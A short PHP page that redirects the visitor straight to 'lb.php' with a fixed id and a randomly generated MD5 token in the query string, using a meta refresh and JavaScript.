<?php
$md5 = md5(uniqid(time()));
$loc="lb.php?id=13698&default=".$md5;
?>
<html><head>
<meta HTTP-Equiv="refresh" content="0; URL=<?echo $loc; ?>">
<script type="text/javascript">
loc = "<?echo $loc; ?>"
self.location.replace(loc);
window.location = loc;
</script>
</head></html>